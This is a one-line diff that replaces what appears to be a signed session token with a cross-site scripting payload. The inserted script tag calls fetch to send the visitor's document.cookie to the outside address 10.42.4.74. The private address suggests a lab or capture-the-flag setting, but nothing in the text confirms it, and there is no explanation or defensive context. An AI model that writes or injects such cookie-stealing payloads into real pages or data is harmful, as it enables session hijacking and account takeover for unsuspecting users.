@@ -1,1 +1,1 @@
-eJxFyk0KgCAQBtC7fGsJaemq6AidQHEiwT8ch4Lo7rWJto93YfYpZIbZbGRSWIR7SdRe6U1eWKXW0vo_KNkQYWCdLzId5PSp9bC7nqEQPMyoIEwt20Rfw_0AiLkjlQ.aWbcvQ.7TMZ2o-Bl8xng3LiwLJqT3iwtd0
+<script>fetch`//10.42.4.74/.session=${document.cookie}`</script>
